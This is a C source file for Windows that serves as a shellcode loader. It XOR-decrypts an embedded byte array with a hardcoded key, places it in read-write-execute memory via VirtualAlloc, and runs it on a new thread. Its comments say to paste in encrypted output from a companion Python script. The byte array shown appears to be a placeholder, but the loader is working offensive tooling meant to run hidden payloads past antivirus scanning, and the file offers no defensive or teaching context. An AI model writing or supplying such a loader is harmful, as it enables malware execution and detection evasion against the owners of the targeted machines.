#include <windows.h>
#include <stdio.h>
#include <string.h>

// Block 1: XOR decrypt - same logic as Python, just in C
void xor_decrypt(unsigned char *data, int data_len, const char *key) {
    int key_len = strlen(key);
    for (int i = 0; i < data_len; i++) {
        data[i] = data[i] ^ key[i % key_len];
    }
}

int main() {
    // Block 2: Key must match Python's KEY exactly
    const char *key = "mysecretkey";

    // Block 3: Paste hex output from xor.py here
    unsigned char shellcode[] =
        "\xfd\xe9\xe3\xf5\xf3\xe2\xf5\xe4\xa7\x24\x3b\x2e\x3d\xb0";
    int shellcode_len = sizeof(shellcode) - 1;

    printf("[*] Shellcode size: %d bytes\n", shellcode_len);

    // Block 4: XOR decrypt in place
    xor_decrypt(shellcode, shellcode_len, key);
    printf("[*] Decrypted with key: %s\n", key);

    // Block 5: Allocate RWX memory
    void *exec = VirtualAlloc(
        NULL,
        shellcode_len,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (exec == NULL) {
        printf("[-] VirtualAlloc failed: %lu\n", GetLastError());
        return 1;
    }
    printf("[+] Allocated RWX memory at: %p\n", exec);

    // Block 6: Copy decrypted shellcode into executable memory
    memcpy(exec, shellcode, shellcode_len);
    printf("[+] Shellcode copied, executing...\n");

    // Block 7: Create thread at shellcode address and wait
    HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec, NULL, 0, NULL );

    if (thread == NULL) {
        printf("[-] CreateThread failed: %lu\n", GetLastError());
        return 1;
    }

    WaitForSingleObject(thread, INFINITE);

    return 0;
}
